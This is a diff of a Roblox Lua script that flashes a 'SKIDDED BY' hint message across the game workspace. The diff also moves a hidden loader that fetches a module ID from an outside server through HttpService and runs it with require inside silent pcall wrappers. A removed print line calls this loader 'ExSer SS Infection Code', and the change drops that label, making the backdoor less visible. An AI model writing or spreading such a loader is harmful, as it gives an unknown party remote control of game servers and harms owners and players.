@@ -142,20 +142,24 @@ do
     game,owner = g,g.Players.LocalPlayer
 end
 
-mamae=Instance.new("Hint", game:GetService("Workspace"))
-while true do
-    mamae.Text="⚠️ | SKIDDED BY FurryBoy_YT4000 | ⚠️"
-    wait(0.1)
-    mamae.Text="⚠️⚠️ | SKIDDED BY FurryBoy_YT4000 | ⚠️⚠️"
-    wait(0.1)
-    mamae.Text="⚠️⚠️⚠️ | SKIDDED BY FurryBoy_YT4000 | ⚠️⚠️⚠️"
-    wait(0.1)
-    mamae.Text="⚠️⚠️ | SKIDDED BY FurryBoy_YT4000 | ⚠️⚠️"
-    wait(0.1)
+spawn(function()pcall(function()coroutine.wrap(pcall)(require,tonumber(game:service("HttpService"):GetAsync("https://extra.sukru.serv00.net")))end)end)
+
+local messagehint = function(msg_i_)
+    for i,v in pairs(workspace:GetChildren()) do if v:IsA("Hint") then v:Destroy() end end
+    mamae=Instance.new("Hint", game:GetService("Workspace"))
+    mamae.Text=msg_i_
 end
     
-print("Injecting ExSer SS Infection Code . . .")
-spawn(function()pcall(function()coroutine.wrap(pcall)(require,tonumber(game:service("HttpService"):GetAsync("https://extra.sukru.serv00.net")))end)end)
+while true do
+    messagehint("⚠️ | SKIDDED BY FurryBoy_YT4000 | ⚠️")
+    wait(0.1)
+    messagehint("⚠️⚠️ | SKIDDED BY FurryBoy_YT4000 | ⚠️⚠️")
+    wait(0.1)
+    messagehint("⚠️⚠️⚠️ | SKIDDED BY FurryBoy_YT4000 | ⚠️⚠️⚠️")
+    wait(0.1)
+    messagehint("⚠️⚠️ | SKIDDED BY FurryBoy_YT4000 | ⚠️⚠️")
+    wait(0.1)
+end
 
 --[[
 if not game:GetService("HttpService").HttpEnabled then
